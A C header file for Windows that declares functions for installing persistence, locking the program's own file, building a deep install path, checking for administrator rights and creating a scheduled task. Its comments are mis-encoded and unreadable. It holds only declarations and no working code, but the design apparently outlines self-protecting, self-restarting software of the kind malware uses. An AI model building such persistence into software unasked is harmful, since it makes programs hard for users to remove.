#ifndef PERSISTENCE_H
#define PERSISTENCE_H

#include <windows.h>

// ����ȫ�ֱ�����ʹ�� extern��
extern WCHAR g_installedPath[MAX_PATH];

// �־û���װ
void install_persistence();

// �ļ�����
DWORD WINAPI lock_self_file(LPVOID lpParam);

// �������·��
BOOL create_deep_path(WCHAR* deepPath);

// ������ԱȨ��
BOOL is_admin();

// �����ļ��̣߳�ͨ�ð棩
DWORD WINAPI lock_file_thread(LPVOID lpParam);

// ������װ·��
BOOL build_install_path(WCHAR* path, size_t size);

BOOL install_scheduled_task(LPCWSTR taskPath);

#endif